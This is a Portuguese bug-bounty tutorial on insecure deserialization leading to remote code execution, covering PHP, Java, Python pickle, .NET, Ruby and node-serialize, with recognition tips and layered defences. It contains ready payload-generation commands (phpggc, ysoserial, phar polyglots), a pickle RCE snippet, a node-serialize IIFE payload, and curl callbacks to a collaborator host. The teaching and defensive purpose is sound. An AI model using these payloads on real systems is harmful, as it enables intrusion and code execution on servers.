---
title: "Insecure Deserialization: de objeto serializado a RCE"
description: "Como um dado serializado vindo do cliente vira execução de código no servidor — e por que deserializar input não-confiável é uma das falhas mais perigosas da web."
author: matheus
date: 2026-06-03 23:38:00 -0300
categories: [Bug Bounty, Vulnerabilidades]
tags: ["insecure deserialization", "desserialização insegura", "RCE", "gadget chain", "POP chain", "ysoserial", "PHPGGC", "Pickle", "phar", "Marshal", "OWASP", "bug bounty", "web security"]
pin: false
comments: true
---

## Quando um cookie vira shell no servidor

Imagina que você está testando `app.exemplo.com` e repara num cookie esquisito:

```
Cookie: session=Tzo0OiJVc2VyIjoyOntzOjQ6Im5hbWUiO3M6NToiYWxpY2UiO3M6NDoicm9sZSI7czo0OiJ1c2VyIjt9
```

Você joga esse valor num decoder Base64 e sai isto:

```
O:4:"User":2:{s:4:"name";s:5:"alice";s:4:"role";s:4:"user";}
```

Isso não é JSON, não é XML. É um **objeto PHP serializado** — e o servidor vai pegar esse texto e **reconstruir um objeto a partir dele**. Se ele faz isso sem desconfiar do que veio do cliente, você acabou de encontrar a porta de entrada para uma das falhas mais brutais da web: **Insecure Deserialization** (deserialização insegura). No melhor cenário, dá pra mexer no `role` e virar admin. No pior — e mais comum do que parece —, dá pra chegar a **RCE**: rodar comando no servidor.

> 💡 **RCE (Remote Code Execution)**: a falha mais grave da web — o atacante executa código/comandos arbitrários no servidor da vítima (ler arquivos, abrir shell, pivotar). Saiba mais no [Glossário](/posts/fundamentos-web-hacking/).

Deserialização insegura era uma categoria própria no OWASP Top 10 de 2017 (**A8:2017 — Insecure Deserialization**) e, na edição de 2021, foi absorvida pela categoria mais ampla **A08:2021 — Software and Data Integrity Failures** do [OWASP Top 10](https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/) (CWE relacionada: **CWE-502 — Deserialization of Untrusted Data**). Não aparece em todo alvo — depende da tecnologia —, mas quando aparece, costuma ser **crítica** e pagar muito bem. Quando a deserialização leva a RCE não-autenticada, o score reflete isso: **CVSS v3.1 ≈ 9.8** (`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`) e o equivalente **CVSS v4.0 ≈ 9.3** (`AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N`) — *Critical* nas duas versões. Neste post a gente vai do "o que diabos é serializar" até montar uma **gadget chain** que chega a RCE, linguagem por linguagem, com as ferramentas que o mercado usa de verdade.

## O que é serializar e deserializar?

Todo programa trabalha com **objetos** na memória: uma struct com campos, um array, uma instância de classe. Esses objetos vivem na RAM e não dá pra mandá-los "como estão" por um cabo de rede ou salvá-los num arquivo. É preciso convertê-los para uma sequência de bytes/texto — e depois reconstruí-los do outro lado.

> 💡 **Serializar**: transformar um objeto da memória em uma sequência de bytes ou texto (para salvar em disco, enviar pela rede, guardar num cookie). **Deserializar** é o caminho de volta: pegar esses bytes e remontar o objeto na memória.

> **Analogia:** pensa num móvel da loja sueca. **Serializar** é desmontar o armário, colocar todas as peças e o manual numa caixa plana — assim ele cabe no carro (trafega). **Deserializar** é, em casa, abrir a caixa e remontar o armário seguindo o manual. O problema da deserialização insegura é simples: e se **um estranho** trocar as peças e o manual dentro da caixa antes de você abrir? Você vai montar, de olhos fechados, exatamente o que ele mandou — inclusive uma armadilha.

Isso por si só é inofensivo. Serializar/deserializar é uma operação do dia a dia: cache, sessão, fila de mensagens, comunicação entre microsserviços. **O perigo não é a deserialização — é deserializar dado que veio de uma fonte não-confiável.**

## Por que deserializar dado não-confiável é perigoso

A intuição de iniciante é: *"é só dado, no máximo a pessoa muda um valor"*. Errado. A diferença entre formatos seguros e perigosos está no que o processo de "remontar" é capaz de fazer.

Quando você faz `json_decode()`, o resultado é **sempre** um dado burro: string, número, array, objeto genérico. Não roda código, não instancia classe nenhuma sua.

Quando você usa a serialização **nativa** da linguagem (PHP `unserialize`, Java `ObjectInputStream`, Python `pickle`, .NET `BinaryFormatter`), o processo é muito mais poderoso: ele **reconstrói instâncias de classes reais** da sua aplicação, com os atributos que o atacante escolher. E aqui está o pulo do gato — ao reconstruir esses objetos, a linguagem pode disparar **métodos automaticamente** (em PHP, os *magic methods*; em Python, o `__reduce__`). O atacante controla **quais classes** são criadas, **com quais valores**, e isso aciona código que já existe na aplicação.

> 💡 **Sink (ponto perigoso)**: a função onde o dado controlado "aterrissa" e causa estrago — ex.: `system()`, `eval()`, `file_put_contents()`. O dado sai de uma *source* (entrada do atacante) e flui até um *sink*. Conceito recorrente em [RCE](/posts/rce-command-injection-ssti/) e [SQL Injection](/posts/sql-injection/).

Resumindo o perigo: deserializar input não-confiável dá ao atacante o poder de **fabricar objetos arbitrários** dentro do seu processo. Daí pra frente é questão de achar o caminho certo até um sink.

## O conceito central: gadget chain (POP chain)

Esse é o conceito que separa quem "entende de cabeça" de quem só decora payload. Preste atenção aqui.

O atacante **não injeta código novo**. Repito: ele não manda um `.php` malicioso, não escreve a função que executa o comando. **Todo o código já existe na aplicação** (ou nas bibliotecas/frameworks que ela usa).

> 💡 **Gadget**: um trecho de código que **já existe** na aplicação (ou numa lib) e que, sozinho, é inofensivo — mas pode ser abusado quando alimentado com a entrada certa. Pense numa "peça de Lego" reutilizável.

> 💡 **Gadget chain (cadeia de gadgets) / POP chain**: o encadeamento de vários gadgets de modo que a saída de um vira a entrada do próximo, até o dado do atacante chegar a um sink perigoso. "POP" = *Property-Oriented Programming* — você programa o ataque escolhendo as **propriedades** (atributos) dos objetos, não escrevendo código.

A ideia em três tempos:

1. **Kick-off gadget** (a fagulha): um método que dispara **automaticamente** quando o objeto é deserializado (ex.: `__wakeup` / `__destruct` em PHP). O atacante não precisa chamá-lo — a própria deserialização chama.
2. **Gadgets intermediários**: o kick-off chama um método de outro objeto (cujos atributos o atacante também controla), que chama outro, que chama outro... passando o dado adiante.
3. **Sink gadget** (o estrago): no fim da cadeia, o dado controlado chega a uma função perigosa (`system`, `eval`, escrita de arquivo) e roda.

> **Analogia:** a gadget chain é como uma máquina de Rube Goldberg (aquelas reações em cadeia malucas — a bolinha empurra o dominó, que acende a vela, que estoura o balão...). O atacante não constrói as peças; ele **organiza as que já estão na sala** numa sequência que termina detonando uma bomba. Você só forneceu a primeira bolinha (o objeto serializado).

Por isso não adianta dizer "minha app não tem código vulnerável": a chain costuma morar nas **bibliotecas** (Apache Commons Collections em Java, Laravel/Monolog/Guzzle em PHP). Você importou a biblioteca por um motivo legítimo e ela trouxe os gadgets de brinde. As ferramentas `ysoserial` e `phpggc` (mais à frente) existem justamente para montar essas chains prontas pra dezenas de libs populares.

## Por linguagem: como o ataque se materializa

A teoria é a mesma; o formato e os mecanismos mudam. Vamos ao concreto.

### PHP — `unserialize()` e os magic methods

PHP serializa objetos num **formato de texto legível**. Conhecer esse formato é o que te permite reconhecer e forjar payloads. Cada tipo tem um prefixo:

| Prefixo | Tipo | Exemplo |
|---|---|---|
| `O:` | Objeto (classe) | `O:4:"User":2:{...}` → classe `User` (nome de 4 letras), 2 propriedades |
| `s:` | String | `s:5:"alice";` → string de 5 chars |
| `i:` | Inteiro | `i:42;` |
| `b:` | Booleano | `b:1;` (true) / `b:0;` (false) |
| `a:` | Array | `a:2:{...}` → array com 2 elementos |
| `N;` | Null | `N;` |

Então este objeto:

```php
class User { public $name = "alice"; public $role = "user"; }
```

vira esta string serializada:

```
O:4:"User":2:{s:4:"name";s:5:"alice";s:4:"role";s:4:"user";}
```

Repare: os atributos são **texto editável**. Trocar `s:4:"user"` por `s:5:"admin"` (lembrando de ajustar o tamanho `5`!) é trivial — esse é o ataque "fraco" (manipular dados). O ataque **forte** usa os *magic methods*: métodos que o PHP chama sozinho em momentos específicos.

> 💡 **Magic method (método mágico) em PHP**: método com nome reservado (começa com `__`) que o PHP invoca **automaticamente** em certos eventos, sem você chamar.

Os dois que importam aqui:

- **`__wakeup()`** — invocado **assim que um objeto é deserializado** por `unserialize()`. Kick-off perfeito.
- **`__destruct()`** — invocado quando o objeto é destruído / coletado pelo garbage collector (no fim do script). Outro kick-off clássico.

Exemplo didático de classe vulnerável (kick-off → sink direto):

```php
class TempFile {
    public $filename;
    function __destruct() {
        unlink($this->filename);   // <- SINK: apaga o arquivo apontado pela propriedade
    }
}
```

Se o atacante forja `O:8:"TempFile":1:{s:8:"filename";s:11:"/etc/passwd";}` e o servidor deserializa, no fim do script o `__destruct` roda e o `unlink` apaga o arquivo que **o atacante escolheu**. Em cadeias reais isso vai muito além: o `__destruct` chama um método de outro objeto controlado, que termina num `system()` ou `eval()`.

> 💡 **Garbage collector**: rotina que libera da memória objetos que não estão mais em uso. Em PHP, é quando o `__destruct` dispara — relevante porque a chain pode "esperar" o fim do script pra detonar.

**Ferramenta — phpggc.** Montar essas chains à mão é trabalhoso. O [**phpggc** (PHP Generic Gadget Chains)](https://github.com/ambionics/phpggc) é "uma biblioteca de payloads de `unserialize()` com uma ferramenta pra gerá-los" — o equivalente PHP do ysoserial. Ele já traz chains prontas pra Laravel, Symfony, Monolog, Guzzle, Doctrine, WordPress e dezenas de outros:

```bash
# Lista todas as gadget chains disponíveis
./phpggc -l

# Gera um payload que executa `id` via system() abusando do Monolog
./phpggc Monolog/RCE1 system 'id'
# saída: a string serializada pronta pra colar no parâmetro/cookie vulnerável
# (a chain e os parâmetros são case-insensitive: 'monolog/rce1' também funciona)
```

**Sem `unserialize()` à vista: phar:// deserialization.** Aqui está o truque que pega muito iniciante de surpresa — dá pra disparar uma POP chain em PHP **sem que o código chame `unserialize()` em lugar nenhum**. Um arquivo `.phar` (PHP Archive) guarda seus **metadados em formato serializado**; quando uma função de filesystem opera sobre um caminho com o wrapper `phar://`, o PHP **deserializa esses metadados automaticamente**. Ou seja: basta o atacante conseguir (1) plantar um `.phar` no servidor (via upload — mesmo "disfarçado" de imagem) e (2) fazer o app rodar uma função de arquivo sobre `phar://caminho/do/arquivo`.

A lista de funções que **disparam** a deserialização do phar é longa e inclui as mais corriqueiras: `file_exists`, `file_get_contents`, `fopen`, `is_dir`, `is_file`, `getimagesize`, `unlink`, `copy`, `stat`, entre outras. Por isso essa técnica casa muito bem com [LFI / Path Traversal](/posts/lfi-path-traversal/): um ponto de inclusão de arquivo que você controlaria pra ler `/etc/passwd` pode, apontando para `phar://`, virar **RCE** via gadget chain.

```bash
# phpggc gera o .phar pronto (note os flags -p phar e -o)
./phpggc -p phar -o exploit.phar Monolog/RCE1 system 'id'
# depois: faça o app operar sobre phar://.../exploit.phar (ex.: ?file=phar://./uploads/avatar.jpg)
# polyglot phar+jpeg pra burlar validação de upload por extensão/magic bytes:
./phpggc -pj imagem.jpg -o exploit.phar Monolog/RCE1 system 'id'
```

> 💡 **`phar://`**: wrapper de stream do PHP que trata um arquivo `.phar` como se fosse um diretório. O perigo: ao acessar `phar://arquivo`, o PHP lê e **deserializa os metadados** do archive — convertendo qualquer função de filesystem num gatilho de POP chain.

### Java — `ObjectInputStream` e a assinatura mágica

Em Java, a deserialização nativa é o `readObject()` da classe `ObjectInputStream`. Diferente do PHP, o formato é **binário** — mas ele tem uma assinatura fixa no começo que é ouro puro pra detecção.

> ⚠️ **Assinatura mágica do Java serializado:** todo stream começa com os bytes `AC ED 00 05` (`AC ED` = `STREAM_MAGIC`, `00 05` = `STREAM_VERSION` 5). Em **Base64**, esses bytes viram o prefixo **`rO0AB`** (frequentemente você verá só `rO0`).

Ou seja: viu um parâmetro/cookie/corpo começando com `rO0AB...` em Base64, ou os bytes `AC ED 00 05` no hex? **É objeto Java serializado.** IDS e WAFs inclusive usam essa assinatura como regra de detecção.

A chain mais famosa do mundo abusa do **Apache Commons Collections**, uma biblioteca utilitária presente em milhares de apps Java. O kick-off varia (um `readObject` que aciona um `Map`, que aciona um `Transformer`...), e o sink final é um `InvokerTransformer` que chama `Runtime.exec()` via reflection — rodando o comando do atacante.

**Ferramenta — ysoserial.** O [**ysoserial** (de Chris Frohoff)](https://github.com/frohoff/ysoserial) é o canivete suíço aqui: gera "payloads que exploram deserialização insegura de objetos Java", embrulhando o comando que você quer numa gadget chain e cuspindo os bytes serializados:

```bash
# Sintaxe: java -jar ysoserial.jar [PAYLOAD] '[COMANDO]'
java -jar ysoserial.jar CommonsCollections1 'id' > payload.bin

# Inspecionar os bytes gerados (note o AC ED 00 05 no início)
java -jar ysoserial.jar CommonsCollections1 'calc.exe' | xxd | head
```

Payloads embutidos incluem `CommonsCollections1` a `CommonsCollections7`, `Spring1`/`Spring2`, `Groovy1`, `Hibernate1`, `ROME`, entre outros — cada um para uma biblioteca/versão diferente no classpath do alvo.

> 💡 **Classpath**: a lista de bibliotecas (.jar) que uma aplicação Java tem disponível em tempo de execução. A chain só funciona se a lib que ela usa estiver no classpath do alvo — daí testar vários payloads.

### Python — `pickle` e o `__reduce__`

O módulo **`pickle`** do Python é o caso mais didático de "perigoso por design". A própria documentação oficial avisa em letras garrafais: **nunca dê `unpickle` em dado de fonte não-confiável.**

O motivo é o método **`__reduce__`**: quando você "pickla" um objeto, o Python pergunta a ele *"como você quer ser reconstruído?"*. O `__reduce__` responde com uma **tupla `(callable, args)`** — uma função e os argumentos pra chamá-la. Na hora do `pickle.loads()`, o Python **executa esse callable com esses argumentos**. Sacou o problema? O atacante só precisa fazer o `__reduce__` devolver `(os.system, ('comando',))`:

```python
import pickle, os

class RCE:
    def __reduce__(self):
        return (os.system, ('id',))   # <- callable + args; o loads() vai EXECUTAR isto

payload = pickle.dumps(RCE())        # gera o pickle malicioso
# ...no servidor vulnerável:
pickle.loads(payload)                # roda `id` — RCE imediato
```

Aqui nem precisa de gadget chain elaborada: o `pickle` te dá execução de código **diretamente**. Por isso ele é tão temido — e por isso a regra é absoluta. O mesmo vale para `PyYAML` com `yaml.load()` sem `SafeLoader`, e para `jsonpickle`.

> 💡 **`__reduce__`**: método que diz ao `pickle` como reconstruir um objeto, retornando `(função, argumentos)`. Como o `loads()` chama essa função, controlar o `__reduce__` = executar código.

### .NET — `BinaryFormatter`

No mundo .NET, o vilão histórico é o **`BinaryFormatter`** (e parentes como `SoapFormatter`, `NetDataContractSerializer`, `LosFormatter`). Eles serializam incluindo o **tipo concreto** do objeto, o que abre o mesmo cenário de gadget chains (a ferramenta **ysoserial.net** é o análogo do ysoserial para .NET). A própria Microsoft marcou o `BinaryFormatter` como **inseguro e que "não pode ser tornado seguro"** — a orientação oficial é **parar de usá-lo** (a partir do .NET 9, a implementação embutida até lança exceção ao ser usada).

O caso mais comum hoje, porém, é **JSON inseguro**: o **JSON.NET (Newtonsoft.Json)** com `TypeNameHandling` diferente de `None`. Quando ativado (`Auto`, `Objects`, `Arrays` ou `All`), o JSON.NET passa a embutir e **honrar o campo `$type`** dentro do JSON — ou seja, o atacante escolhe **qual classe .NET instanciar**. Basta um campo do tipo `object` em qualquer ponto da árvore pra ele plantar um gadget de execução de código:

```json
{ "$type": "System.Configuration.Install.AssemblyInstaller, System.Configuration.Install, ...", "Path": "..." }
```

O `ysoserial.net` gera esses payloads tanto pro `BinaryFormatter` quanto pra Json.NET (e dezenas de outros serializadores/formatters). Sinal de alerta no recon: ViewState do ASP.NET (serializado por `ObjectStateFormatter`/`LosFormatter`) mal configurado — sem `MAC`/criptografia, ou com `machineKey` vazada — permite forjar um payload que o servidor deserializa; o **ysoserial.net** gera exatamente esse tipo de gadget (plugin `ViewState`).

### Ruby — `Marshal.load` e a gadget chain universal

Ruby tem seu próprio formato binário de serialização, manipulado por `Marshal.dump` (serializa) e `Marshal.load` (deserializa). Como nos demais, o perigo mora em passar **input não-confiável** para `Marshal.load` (ou para `marshal_load`, e indiretamente em cache do Rails configurado com store Marshal).

> ⚠️ **Assinatura do Marshal:** todo stream começa com **dois bytes de versão**, tipicamente `04 08` (major 4, minor 8) — em Base64, o prefixo costuma ser **`BAh`**. Viu um blob Base64 começando com `BAh`? É provavelmente um objeto Ruby serializado.

O que torna Ruby especialmente perigoso é a existência de uma **gadget chain universal** (descoberta por Luke Jahnke, da elttam) que funciona em Ruby 2.x **sem depender de Rails nem de nenhuma lib específica** — basta o atacante controlar o argumento de `Marshal.load`. A chain encadeia objetos da própria stdlib até cair em execução de comando. A regra é a mesma do pickle: **não dê `Marshal.load` em dado externo**; para dados, use JSON (`JSON.parse`). Atenção também a `YAML.load` em versões antigas (use `YAML.safe_load`) e a `Oj` com `mode: :object`.

### Node.js — `node-serialize` e o `_$$ND_FUNC$$_`

JSON puro é seguro, mas algumas libs "turbinam" a serialização pra incluir **funções** — e aí entra o risco. O caso clássico é o pacote **`node-serialize`** (≤ 0.0.4, [CVE-2017-5941](https://nvd.nist.gov/vuln/detail/CVE-2017-5941)). Ele marca funções serializadas com o prefixo mágico **`_$$ND_FUNC$$_`**. Na hora do `unserialize()`, a lib reconstrói essa função — e se o atacante anexar um **IIFE** (função autoexecutável, com `()` no fim), ela roda na hora:

> 💡 **IIFE (Immediately Invoked Function Expression)**: função em JavaScript que se executa sozinha assim que é definida, por ter `()` logo depois do corpo — ex.: `(function(){ ... })()`.

```javascript
// Payload: a função é marcada com _$$ND_FUNC$$_ e o () final a auto-executa (IIFE)
var payload = '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'id\', function(e,out){console.log(out)})}()"}';
serialize.unserialize(payload);   // <- executa `id`
```

Sinal de recon: ver `_$$ND_FUNC$$_` num cookie/parâmetro Base64 grita "node-serialize vulnerável".

## Recon — como reconhecer um formato serializado

Você não acha deserialização caçando uma URL; você acha **reconhecendo o formato** no tráfego. Treine o olho para isto (vale a pena testar tudo passando por Base64 primeiro):

| Você vê... | Provável formato | Pista |
|---|---|---|
| `O:4:"User":...`, `a:2:{...}`, `s:5:"..."` | **PHP serializado** | Prefixos `O:` `a:` `s:` `i:` |
| Base64 começando com **`rO0AB`** (ou `rO0`) | **Java serializado** | Decodifica pra bytes `AC ED 00 05` |
| Bytes hex **`AC ED 00 05`** | **Java serializado** | A assinatura mágica |
| Bytes começando com `\x80` + versão (ex.: `\x80\x04`, `\x80\x05`) — em Base64, prefixo `gA...` (ex.: `gAS` p/ protocolo 4, `gAW` p/ protocolo 5) | **Python pickle** | Opcode `PROTO` (`0x80`) + nº do protocolo |
| Bytes `04 08` no início — em Base64, prefixo **`BAh`** | **Ruby Marshal** | Versão do formato Marshal (major 4, minor 8) |
| `_$$ND_FUNC$$_` no JSON | **node-serialize** | Marcador de função |
| `__VIEWSTATE=...` no POST do ASP.NET, ou `"$type"` no corpo JSON | **.NET** (ViewState via `ObjectStateFormatter`/`LosFormatter`; ou JSON.NET com `TypeNameHandling`) | Campo do ViewState / marcador `$type` |

**Onde olhar:** cookies de sessão, parâmetros que carregam "estado" (carrinho, preferências, tokens de retorno), campos hidden, corpos de API, headers customizados, mensagens em filas. Decodifique **todo Base64 suspeito** — metade do trabalho é só perceber que aquele blob não é um token aleatório, é um objeto.

```bash
# Decodificar rápido um valor suspeito e ver se é texto serializado
echo 'Tzo0OiJVc2VyIjowOnt9' | base64 -d ; echo
# saída: O:4:"User":0:{}  → começa com O:4:"User": → PHP serializado na veia
```

> 💡 **Burp Suite**: proxy de interceptação padrão do mercado para testar web — captura, edita e reenvia requests (Repeater/Intruder). Apresentado no post de [Recon & Discovery](/posts/recon-discovery/).

## Exploração passo a passo (do básico ao avançado)

### Nível 1 — Manipular dados (sem RCE)
Decodifique o objeto, troque um atributo "de poder" (`role`, `isAdmin`, `user_id`), reencode e reenvie. Lembre de **corrigir os tamanhos** no PHP (`s:5:"admin"` — o `5` precisa bater com o número de chars). Isso já vale como [Broken Access Control](/posts/broken-access-control-idor-bola-bfla/) / escalada de privilégio se o servidor confiar no atributo.

### Nível 2 — Confirmar que há deserialização nativa
Mande um objeto deliberadamente **quebrado** (tamanho errado, classe inexistente) e observe: um erro tipo `unserialize(): Error at offset`, `__PHP_Incomplete_Class`, `java.io.InvalidClassException` ou `unpickling stack underflow` na resposta **confirma** que o input está sendo deserializado nativamente.

### Nível 3 — RCE com gadget chain (PHP)
Identifique o framework (headers, `composer.json` vazado, erros) e gere o payload com phpggc:

```bash
./phpggc -l laravel          # ver chains disponíveis pro framework detectado
./phpggc Laravel/RCE9 system 'id' | base64   # gera e codifica pra colar no cookie/param
```

### Nível 4 — RCE com gadget chain (Java)
Confirmado o `rO0AB...`, teste payloads do ysoserial um a um (você não sabe qual lib está no classpath):

```bash
# Prova segura primeiro: faça o alvo bater no SEU servidor (sem comando destrutivo)
java -jar ysoserial.jar CommonsCollections1 'curl https://SEU-COLABORATOR.oast.site' | base64
```

> 💡 **OAST / Collaborator (`*.oast.site`)**: servidor controlado por você que registra qualquer conexão (DNS/HTTP) recebida. Serve pra **provar** execução cega sem rodar nada destrutivo. Detalhe no post de [SSRF](/posts/ssrf/), que usa a mesma técnica.

### Nível 5 — Encadear com outras falhas
Deserialização brilha em [chains](/posts/chaining-vulnerabilidades/): um payload Java serializado entregue via [SSRF](/posts/ssrf/) a um endpoint interno (ex.: porta RMI/JMX), ou um gadget que faz [LFI/leitura de arquivo](/posts/lfi-path-traversal/) quando o RCE direto não rola. A própria conexão de saída de uma chain pode virar SSRF.

## Caso real-fictício: cookie PHP serializado → RCE

> Cenário **fictício, baseado em padrões reais** de programas de bug bounty (anonimizado).

Você testa `app.exemplo.com`. O cookie de sessão é um Base64 que, decodificado, mostra `O:4:"User":2:{s:4:"name";s:5:"alice";...}` — **PHP serializado**, e o app usa o framework Monolog para logs (visto num stack trace vazado).

**Passo 1 — Confirmar a deserialização.** Você corrompe o cookie e a resposta vaza:

```http
HTTP/2 500 Internal Server Error

Notice: unserialize(): Error at offset 0 of 12 bytes in /var/www/app/Session.php on line 88
```

Confirmado: o cookie passa por `unserialize()`.

**Passo 2 — Gerar a chain.** Com o framework conhecido, você usa o phpggc:

```bash
./phpggc Monolog/RCE1 system 'curl https://abc123.oast.site' | base64 -w0
```

**Passo 3 — Disparar (prova segura).** Você troca o cookie pela string gerada:

```http
GET /dashboard HTTP/2
Host: app.exemplo.com
Cookie: session=TzozNDoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjI6...   # <- payload phpggc
```

**O que a tela do Burp/Collaborator mostraria:** segundos depois, o Collaborator registra uma **interação DNS + HTTP** vinda do IP do servidor de `app.exemplo.com`. Isso prova que o `curl` rodou **no servidor** — ou seja, **RCE**. Você nunca rodou comando destrutivo; só fez o alvo "bater na sua porta".

**Passo 4 — Report.** Título `[Insecure Deserialization] - RCE via cookie de sessão PHP serializado`. Severidade **Crítica** (execução de código no servidor) — **CVSS v3.1 9.8** / **v4.0 9.3**. Evidência: o objeto serializado decodificado, o erro de `unserialize` e o hit no Collaborator. (Veja [Como escrever um report que paga](/posts/como-escrever-report-que-paga/).)

## Defesa em camadas

A regra de ouro cabe numa frase: **não deserialize dado não-confiável.** Mas defesa boa é em camadas — se uma falha, a outra segura.

**1. (Melhor de todas) Não deserialize input não-confiável.** Se você só precisa trafegar dados, use um formato **puro de dados** que não instancia classes nem roda código:

```php
// ❌ ERRADO — unserialize em dado do cliente: porta aberta pra gadget chain
$user = unserialize($_COOKIE['session']);

// ✅ CORRETO — JSON: vira array/objeto burro, nunca instancia suas classes nem roda código
$user = json_decode($_COOKIE['session'], true);
```

**2. Se TIVER que usar serialização nativa, assine os dados (HMAC).** Verifique a assinatura **antes** de deserializar — assim o atacante não consegue forjar payload sem a chave secreta.

> 💡 **HMAC**: assinatura criptográfica de uma mensagem usando uma chave secreta. Quem não tem a chave não consegue gerar uma assinatura válida — então um payload adulterado é rejeitado **antes** de chegar ao `unserialize`.

```php
// Verifica HMAC ANTES de deserializar; rejeita qualquer payload adulterado
[$data, $sig] = explode('.', $cookie, 2);
if (!hash_equals(hash_hmac('sha256', $data, $SECRET), $sig)) {
    http_response_code(400); exit;        // assinatura inválida → nem chega no unserialize
}
$obj = unserialize($data, ['allowed_classes' => false]);  // + allowlist (camada 3)
```

**3. Allowlist de classes (restrinja o que pode ser instanciado).** Cada linguagem tem o seu mecanismo — **negue por padrão**, permita só o necessário:

- **PHP:** `unserialize($data, ['allowed_classes' => false])` (nenhuma classe) ou `['allowed_classes' => ['MinhaDTO']]` (só essas). Sem objeto arbitrário, não há kick-off.
- **Java:** sobrescreva `ObjectInputStream.resolveClass()` para validar a classe contra uma allowlist (a lib **SerialKiller** ou o `ValidatingObjectInputStream` do Apache Commons IO fazem isso). Desde o JDK 9, há os filtros `ObjectInputFilter` (`jdk.serialFilter`).
- **Python:** **não use `pickle`** em dado externo. Se precisar de pickle interno, restrinja via `find_class` numa subclasse de `Unpickler`. Para PyYAML, use `yaml.safe_load()` (nunca `yaml.load()` sem `SafeLoader`).
- **.NET:** **não use `BinaryFormatter`** (obsoleto/inseguro). Use `System.Text.Json` ou `DataContractSerializer`; com Json.NET, mantenha `TypeNameHandling.None` (o default seguro) — se precisar de tipos, use um `SerializationBinder` com allowlist estrita.
- **Ruby:** **não dê `Marshal.load`** em dado externo (existe gadget chain universal). Use JSON (`JSON.parse`); para YAML, `YAML.safe_load`.
- **Node.js:** evite libs que serializam funções (`node-serialize` legado); use `JSON.parse`/`JSON.stringify`.

**4. Mantenha as bibliotecas atualizadas.** As gadget chains vivem nas libs. Atualizar Commons Collections, Laravel, Jackson, etc. fecha chains conhecidas. **Mas atenção:** isso **não substitui** as camadas 1–3 — surgem chains novas o tempo todo, em libs que você nem sabe que estão no classpath.

> ❌ **O que NÃO basta:** "remover a lib vulnerável" (outra chain aparece), confiar que "é só um cookie", obfuscar/Base64 o objeto (não é segredo nenhum), ou validar o conteúdo **depois** de deserializar (tarde demais — o kick-off já rodou na própria deserialização).

## Ferramentas + labs legais

- **[ysoserial](https://github.com/frohoff/ysoserial)** — gera payloads de deserialização Java (gadget chains prontas: `CommonsCollections1-7`, `Spring1`, `Groovy1`...).
- **[ysoserial.net](https://github.com/pwntester/ysoserial.net)** — o equivalente para .NET (`BinaryFormatter`, ViewState).
- **[phpggc](https://github.com/ambionics/phpggc)** — gadget chains para PHP (Laravel, Symfony, Monolog, Guzzle, WordPress...).
- **[SerializationDumper](https://github.com/NickstaDB/SerializationDumper)** — lê e disseca um stream Java serializado em formato humano (ótimo pra entender o que está acontecendo).
- **Burp Suite** — extensões **Java Deserialization Scanner** e **Hackvertor** ajudam a detectar e codificar payloads.
- **Labs autorizados:** [PortSwigger Web Security Academy — Insecure deserialization](https://portswigger.net/web-security/deserialization) (gratuito, com labs de PHP/Java/POP chain), HackTheBox, TryHackMe.

## Checklist do caçador

- [ ] Decodifiquei **todo blob Base64 suspeito** em cookies/params/corpos.
- [ ] Reconheci a assinatura: `O:`/`a:`/`s:` (PHP), `rO0AB`/`AC ED 00 05` (Java), `\x80` + versão / prefixo Base64 `gA...` (pickle), `04 08` / Base64 `BAh` (Ruby Marshal), `_$$ND_FUNC$$_` (node), `__VIEWSTATE` / `$type` (.NET).
- [ ] Em PHP, considerei **phar://** mesmo sem `unserialize()` à vista (upload + função de arquivo sobre `phar://`).
- [ ] Mandei um objeto **quebrado** e confirmei a deserialização pelo erro (`unserialize(): Error at offset`, `InvalidClassException`...).
- [ ] Identifiquei **framework/libs** (headers, stack trace, `composer.json`/`pom.xml` vazados) pra escolher a chain.
- [ ] Gerei a chain com **phpggc / ysoserial** e provei RCE de forma **segura** (Collaborator/OAST, sem comando destrutivo).
- [ ] Testei **manipulação de atributo** (role/isAdmin) mesmo quando RCE não rolou.
- [ ] Pensei em **chain** com [SSRF](/posts/ssrf/)/[LFI](/posts/lfi-path-traversal/) se o RCE direto falhou.
- [ ] Confirmei que a classe está **no escopo** do programa.

## Pegadinhas / o que NÃO funciona

- **Esquecer de ajustar o tamanho no PHP.** `s:5:"admin"` com um `4` no lugar do `5` quebra o parsing. Conte os caracteres.
- **Achar que JSON é vulnerável a isso.** `json_decode`/`JSON.parse` **não** instanciam suas classes nem rodam código — o risco aparece em libs que "estendem" o JSON (como `node-serialize`) ou em type-hints inseguros (Jackson `enableDefaultTyping`, Json.NET `TypeNameHandling.All`).
- **Testar uma única chain do ysoserial e desistir.** Cada payload depende de uma lib/versão específica no classpath; teste vários.
- **Rodar comando destrutivo pra "provar".** Use OAST/Collaborator. `id`, `whoami` ou um ping de volta provam o RCE sem causar dano — e sem te colocar em apuros.
- **`__wakeup()` "consertado" não é defesa.** Um `__wakeup` que valida algo não fecha o `__destruct` de **outras** classes que servem de kick-off.
- **Achar que sem `unserialize()` no código não há risco (PHP).** O `phar://` deserializa metadados em dezenas de funções de arquivo (`file_exists`, `fopen`, `getimagesize`...) — sem nenhum `unserialize()` explícito.

## O que você precisa lembrar

- **Serializar** = objeto → bytes/texto; **deserializar** = o caminho de volta. O perigo é deserializar **input não-confiável** com a serialização **nativa** da linguagem.
- A mágica do ataque é a **gadget chain**: o atacante não injeta código novo — ele encadeia **código que já existe** na app/libs até chegar a um **sink** (RCE).
- Reconheça pelas **assinaturas**: `O:`/`s:`/`a:` (PHP — e `phar://` mesmo sem `unserialize()`), `rO0AB` / `AC ED 00 05` (Java), `\x80` + versão / Base64 `gA...` e `__reduce__` (Python — perigosíssimo), `04 08` / Base64 `BAh` (Ruby Marshal), `BinaryFormatter` / `$type` (.NET), `_$$ND_FUNC$$_` (Node).
- Ferramentas do ofício: **phpggc** (PHP), **ysoserial** (Java), **ysoserial.net** (.NET).

> 💡 **Dica de ouro:** sempre que um valor opaco (cookie, param, blob Base64) **não for um token aleatório**, decodifique-o. Se sair `O:`, `a:`, `rO0AB` ou os bytes `AC ED 00 05`, você está diante de um objeto serializado — e metade do caminho pra um achado **crítico** já foi andada. O resto é casar a chain certa com a lib certa.

## Nota ética

